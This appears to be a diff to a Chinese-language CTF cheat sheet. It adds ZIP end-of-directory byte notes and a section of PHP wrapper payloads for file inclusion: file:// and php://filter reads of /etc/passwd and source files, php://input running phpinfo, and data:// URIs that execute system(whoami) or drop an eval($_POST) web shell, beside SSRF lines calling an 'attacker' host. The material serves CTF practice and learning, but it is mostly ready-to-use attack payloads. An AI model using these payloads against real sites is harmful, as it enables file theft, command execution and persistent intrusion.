@@ -289,6 +289,17 @@ A5 4A：最后修改文件日期
 00 00 00 00：局部头部偏移量
 ```
 
+压缩文件源文件目录结束区：
+
+```
+50 4B 05 06：目录结束标记(0x06054b50)
+00 00：当前磁盘编号
+00 00：目录区开始磁盘编号
+01 00：本磁盘上纪录总数
+01 00：目录区中纪录总数
+59 00 00 00：目录区尺寸大小
+```
+
 真假加密：
 
 ```
@@ -368,7 +379,6 @@ file://path/to/file
 file:///etc/passwd
 file://\/\/etc/passwd
 ssrf.php?url=file:///etc/passwd
-
 ```
 
 ##### http
@@ -390,6 +400,56 @@ ssrf.php?url=dict://attacker:11111/
 
 ```
 index.php?path=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+#### PHP伪协议
+
+file协议：
+
+```
+http://ip:port/readme.php?filename=file:///var/log/auth.log
+```
+
+filter协议：
+
+```
+http://ip:port/readme.php?filename=php://filter/read/convert.base64-encode/resource=./index.php(或者其他读取文件中含有php代码)
+```
+
+filter+file协议：
+
+```
+http://ip:port/readme.php?filename=php://filter/read/convert.base64-encode/resource=file:///etc/passwd
+```
+
+input协议：
+
+```
+http://ip:port/readme.php?filename=php://www.test.com?filename=php://input
+
+# POST方式，参数为：
+<?php phpinfo();?>
+```
+
+data协议：
+
+```
+data://text/plain;base64,
+
+# 打印data://的内容
+<?php
+// 打印 "I love PHP"
+echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');
+?>
+```
+
+```
+# 执行系统命令
+# 将 <?php system(whoami)?> base64编码：PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==
+http://ip:port/readme.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==
+
+# 也可以将webshell进行base64编码/或不编码
+http://ip:port/readme.php?filename=data://text/plain;base64,<?php eval($_POST["cmd"];)?>
 ```
 
 ### Reverse
